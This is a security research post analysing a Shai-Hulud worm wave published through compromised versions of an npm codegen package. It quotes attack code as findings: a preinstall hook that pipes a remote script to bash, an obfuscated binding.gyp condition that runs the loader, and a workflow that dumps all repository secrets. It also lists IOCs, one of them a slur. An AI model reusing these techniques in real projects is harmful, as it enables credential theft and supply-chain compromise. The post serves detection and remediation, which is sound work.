---
excerpt: "JFrog Security Research detected a new Shai-Hulud wave on @7nohe/openapi-react-query-codegen. Ten npm versions drop a Trinitite-labeled worm through preinstall and an obfuscated binding.gyp command."
title: "Shai-Hulud Trinitite Hits @7nohe/openapi-react-query-codegen"
date: "August 30, 2026"
description: "Yair Benamou, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/Trinitite/Trinitite.png
type: realTimePost
minutes: '8'
---

JFrog Security Research detected a new Shai-Hulud wave that landed on August 28, 2026. The target is `@7nohe/openapi-react-query-codegen`, a TanStack Query codegen package. Ten versions went out in about twenty minutes.

![](/img/RealTimePostImage/post/Trinitite/Trinitite.png)

This is the same worm family we covered in [Shai-Hulud: Here We Go Again](https://research.jfrog.com/post/shai-hulud-here-we-go-again/), the [May 19 @antv wave](https://research.jfrog.com/post/shai-hulud-here-we-go-again-may19/), and [Miasma](https://research.jfrog.com/post/shai-hulud-miasma-redhat-cloud-services/). What changed is the packaging, the campaign strings, and how quietly `binding.gyp` now hides the install-time command.

A note on timing: The people behind TeamPCP were arrested in Australia in late August. This package showed up on npm about a day later. Same kit, new RSA keys, new graffiti. Could be leftover access. Could be someone else wearing the cat mask. The payload does not settle that.

The package sits in the 150K+ weekly download range. Anyone who installed a listed version with lifecycle scripts, or who let `node-gyp` evaluate the planted `binding.gyp`, should treat the host as compromised.

## How it got published

The project's release workflow treated any pull-request comment that said exactly `npm publish` as a release trigger. It then checked out that PR and published with GitHub Actions OIDC (`id-token: write`), with no check that the commenter was a maintainer.

GitHub user `p00paboot` opened the PRs and posted the trigger. The workflow minted a trusted-publishing token, so the malicious versions have real provenance. That only shows the job ran in that repo, not that the job was clean.

The first two versions they published were prereleases (`0.0.0-365d4eb…` and `0.0.0-ec7876d6…`). Version `0.0.0-365d4eb…` has a planted `preinstall` script, but not the XOR payload. The eight stable versions that followed are the ones that carry the worm.

## First they asked if it was that simple

That first prerelease has no `3FWCvzduYZg.js` and no `binding.gyp`. The only planted thing is `preinstall`:

```json
"preinstall": "wget -qO- https://raw.githubusercontent.com/oven-sh/bun/refs/heads/main/src/runtime/cli/install.sh|bash ; bash -c 'WORKFLOW_ID=release.yml REPO_ID_SUFFIX=7nohe/openapi-react-query-codegen TARGET_PACKAGES=@7nohe/openapi-react-query-codegen ~/.bun/bin/bun is_it_this_simple.js'"
```

It installs official Bun, then tries to run a file that is not in the tarball. So this version does not drop the worm. The env vars are the interesting part. They are the same knobs the later payload already reads. `WORKFLOW_ID` and `REPO_ID_SUFFIX` tell it to fire the OIDC republish path when it is sitting in this repo's `release.yml`. `TARGET_PACKAGES` is the infection list. They pointed all three at `@7nohe/openapi-react-query-codegen`. The filename is the question: `is_it_this_simple.js`.

Then they shipped the XOR blob.

## Two ways the later versions run

Wave 1 (`0.5.4`, `1.6.3`, `2.2.1`, `3.0.3`) used only `binding.gyp`. Wave 2 (`0.5.5`, `1.6.4`, `2.2.2`, `3.0.4`), twenty minutes later, added a normal hook as well:

```json
"scripts": {
  "preinstall": "node 3FWCvzduYZg.js"
}
```

`3FWCvzduYZg.js` is a 4–6 MB XOR-wrapped loader. `--ignore-scripts` skips the `preinstall` hook, but `node-gyp` can still evaluate `binding.gyp` and run the same file.

![](/img/RealTimePostImage/post/Trinitite/trinitite-payload.png)

## binding.gyp, now with an obfuscated command

Earlier samples hid the launch in a shell expansion, something like `<!(node index.js > /dev/null 2>&1 && echo stub.c)`.

In this one, the real command sits in `conditions`, written as Unicode escapes:

```json
{
  "variables": { "var": "Frot" },
  "conditions": [
    ["[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == u'\\U00000063\\U00000061\\U00000074\\U00000063\\U00000068\\U0000005f\\U00000077\\U00000061\\U00000072\\U0000006e\\U00000069\\U0000006e\\U00000067\\U00000073'][0]()._module.__builtins__[u'\\U0000005f\\U0000005f\\U00000069\\U0000006d\\U00000070\\U0000006f\\U00000072\\U00000074\\U0000005f\\U0000005f'](u'\\U0000006f\\U00000073').system(u'\\U0000006E\\U0000006F\\U00000064\\U00000065\\U00000020\\U00000033\\U00000046\\U00000057\\U00000043\\U00000076\\U0000007A\\U00000064\\U00000075\\U00000059\\U0000005A\\U00000067\\U0000002E\\U0000006A\\U00000073') == 0x00", {}]
  ],
  "targets": [
    {
      "target_name": "<(var)",
      "type": "\x6e\x6f\x6e\x65",
      "sources": ["dog.c"]
    }
  ]
}
```

Decoded, that condition walks Python's class tree to `catch_warnings`, reaches `__builtins__`, and runs:

```text
os.system('node 3FWCvzduYZg.js')
```

`node-gyp` evaluates `conditions` as Python, so no `preinstall` required, and scanners that only look at `package.json` scripts miss it.

## The loader

Same staging we described for Miasma, with the first transform swapped.

1. A ~1.6M-entry integer array, XOR'd with key `9` (older used ROT).
2. Two AES-128-GCM blobs. The small one fetches Bun. The large one is the worm.
3. The worm is written to a random temp `.js`, run under Bun, then deleted.

If Bun is missing, the dropper pulls **v1.4.0** from the real `oven-sh/bun` GitHub release into a directory named `trinnyyyy-*`. On Windows the binary is renamed to six random characters. Previous waves used 1.3.13 and `/tmp/b-*`.

Inside the worm, strings go through a javascript-obfuscator and a second scramble (`faa0a686e`) built on PBKDF2-SHA256 (200k rounds) plus a 3-round substitution. Thirteen more blobs are AES-256-GCM + gzip: the token monitor, the commit-search C2, Claude/VS Code hooks, and the secret-dump workflow.

## Same worm, new stickers

Once it is running, this is Shai-Hulud. It steals GitHub / npm / PyPI / RubyGems / cloud / Vault / Kubernetes material, scrapes `Runner.Worker` memory for `"isSecret":true`, and republishes packages it can write. Stolen data is gzipped, AES-wrapped, RSA-wrapped, and committed to a public repo under the victim token.

The new description is:

```text
Trinitite: Sponsored by Preview 2 Effects
```

Files go under `results/`, but the name is `doubletrinnys-<n>-<timestamp>.json`. If there is no token in the commit, the message is `meow meow meow`. If there is, it is `IfYouRevokeThisTokenYourABadUser:<blob>`.

The planted Actions workflow is the usual secrets dump, renamed:

```yaml
name: ClaudeCode Review
on:
  deployment:
jobs:
  review:
    runs-on: ubuntu-latest
    env:
      PROMPT: ${{ toJSON(secrets) }}
    steps:
      - run: echo "$PROMPT" > res.txt
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          name: reviewed
          path: res.txt
```

Earlier waves called this `Run Copilot`.

PyPI is no longer only a separate `.pth` loader. The JS worm itself pushes stolen `pypi-` tokens at `upload.pypi.org/legacy/` and keeps the ones that look valid. `TYPO_MODE=1` plus `TARGET_PACKAGES` turns that into a typosquat path. RubyGems and JFrog/Artifactory checks are still in the same file.

The unused decoy host moved from `api.anthropic.com` to `poopy.com` / `v1/idk`. We did not see it used.

Before it does anything useful, it checks whether it is running in an analysis environment. If it sees a Russian locale, StepSecurity / `harden-runner` markers, fake prefixes like `AKIAFAKE`, or a short list of researcher GitHub orgs (`actions-security-demo`, `h0x0er`, `varunsh-coder`), it exits.

## Persistence and the revoke trap

Still there. Isolate first.

Linux/macOS install a user service (`systemd-detect-fash` or `sysvinit-detect-fash`) and a Python monitor at `~/.local/share/diaper/poopy.py`. State is `/var/tmp/.shit`. The token monitor polls `GET /user`. A 40x means the token is dead, and the stored handler can wipe `~/` and `~/Documents`. Same trap as May 19, different unit names.

AI-tool hooks are the usual set: Claude `SessionStart`, VS Code `folderOpen`, Cursor / Gemini / Copilot / Aider paths.

## Remediation

- Isolate the machine or runner. Do not revoke GitHub tokens until the monitor is gone.
- Stop and disable `systemd-detect-fash` and `sysvinit-detect-fash` (user systemd on Linux, LaunchAgent on macOS).
- Remove `~/.local/share/diaper/`, `~/.config/sysvinit-detect-fash/`, `/var/tmp/.shit`, and `trinnyyyy-*` temp dirs.
- Drop `3FWCvzduYZg.js` and `binding.gyp` from installs. Pin `0.5.3` / `1.6.2` / `2.2.0` / `3.0.2`. Rebuild lockfiles.
- Then rotate GitHub, npm, PyPI, RubyGems, cloud, SSH, and CI credentials from a clean box.
- Valid provenance on these versions is not a clean bill of health.

## Conclusions

Trinitite is another turn of Shai-Hulud. The collectors, GitHub dead-drop, npm republish path, PyPI token handling, and the revoke trap are the ones we have been cleaning up since spring. What changed is the packaging: a comment-triggered OIDC publish, a first prerelease that only installed Bun and pointed at this repo, then a Unicode `binding.gyp` command that runs even when `package.json` scripts are skipped.

The timing is hard to ignore. The TeamPCP suspects were arrested in Australia in late August, and this package showed up on npm about a day later. Same kit, new RSA keys, new graffiti. That could be leftover access, or someone else using the same loader. The payload does not settle it.

For defenders, the old campaign names (Here We Go Again, Miasma, Hades) will not catch this wave. Hunt the new strings, the `Frot` / `dog.c` `binding.gyp`, and the `3FWCvzduYZg.js` loader. Treat any host that installed a listed version as compromised, and do not revoke GitHub tokens until the monitor is gone.

These malicious versions are detected by JFrog Xray and JFrog Curation.

## IOCs

### Package

| Package | Xray ID | Versions |
| :---- | :---- | :---- |
| `@7nohe/openapi-react-query-codegen` | XRAY-1065308 | `0.5.4`, `0.5.5`, `1.6.3`, `1.6.4`, `2.2.1`, `2.2.2`, `3.0.3`, `3.0.4`, `0.0.0-365d4eb738d3146583431948d3ba6e27a32556be`, `0.0.0-ec7876d6c917dad516ba69bbfafc948b834bf0ab` |

Last safe: `0.5.3`, `1.6.2`, `2.2.0`, `3.0.2`.

### Files and host

```text
3FWCvzduYZg.js
is_it_this_simple.js
binding.gyp
/tmp/trinnyyyy-*/bun
~/.bun/bin/bun
/var/tmp/.shit
~/.local/share/diaper/poopy.py
~/.config/systemd/user/systemd-detect-fash.service
~/.config/systemd/user/sysvinit-detect-fash.service
~/.config/sysvinit-detect-fash/
~/Library/LaunchAgents/com.user.systemd-detect-fash.plist
~/Library/LaunchAgents/com.user.sysvinit-detect-fash.plist
```

### Campaign strings

```text
Trinitite: Sponsored by Preview 2 Effects
doubletrinnys-
meow meow meow
IfYouRevokeThisTokenYourABadUser
Visit69WykenAveForFreeiPod
n1ggatr1n
StopRapingMyBotnetPlz
ClaudeCode Review
poopy.com
v1/idk
```

### Network

```text
hxxps[:]//raw[.]githubusercontent[.]com/oven-sh/bun/refs/heads/main/src/runtime/cli/install.sh
hxxps[:]//github[.]com/oven-sh/bun/releases/download/bun-v1.4.0/
hxxps[:]//api[.]github[.]com/user/repos
hxxps[:]//api[.]github[.]com/search/commits
hxxps[:]//upload[.]pypi[.]org/legacy/
hxxps[:]//registry[.]npmjs[.]org/-/npm/v1/oidc/token/exchange/package/
hxxps[:]//fulcio[.]sigstore[.]dev/api/v2/signingCert
hxxps[:]//rekor[.]sigstore[.]dev/api/v1/log/entries
```
